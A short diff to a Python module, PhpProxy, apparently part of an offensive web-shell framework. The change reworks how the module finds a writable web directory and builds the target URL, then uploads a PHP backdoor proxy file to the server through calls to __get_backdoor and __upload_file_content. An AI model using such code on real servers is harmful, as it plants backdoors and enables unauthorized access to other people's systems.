@@ -8,6 +8,7 @@ Created on 20/set/2011
 from core.module import Module, ModuleException
 from core.vector import VectorList, Vector as V
 from core.parameters import ParametersList, Parameter as P
+from urlparse import urlparse
 import re
 
 
@@ -44,27 +45,32 @@ class PhpProxy(Module):
         self.modhandler.set_verbosity(6)
         
         self.modhandler.load('find.webdir').run({ 'rpath' : 'find' })
+        
         url = self.modhandler.load('find.webdir').url
         dir = self.modhandler.load('find.webdir').dir
         
         self.modhandler.set_verbosity()
-        
+
         return dir, url
         
     
     def run_module(self, rdir, rname):
         
-        
-        path = rdir
-        url = ''
+
 
         if rdir == 'find':
             path, url = self.__find_writable_dir()
-
-        path = path + rname
-        url = url + rname
+        else:
+            path = rdir
+            if path[-1] != '/': path = '%s/' % path
+            urlparsed = urlparse(self.url)
+            url = '%s://%s/' % (urlparsed.scheme, urlparsed.netloc)
 
         if path and url:
+
+            path = path + rname
+            url = url + rname
+
         
             phpfile = self.__get_backdoor()
             response = self.__upload_file_content(phpfile, path)
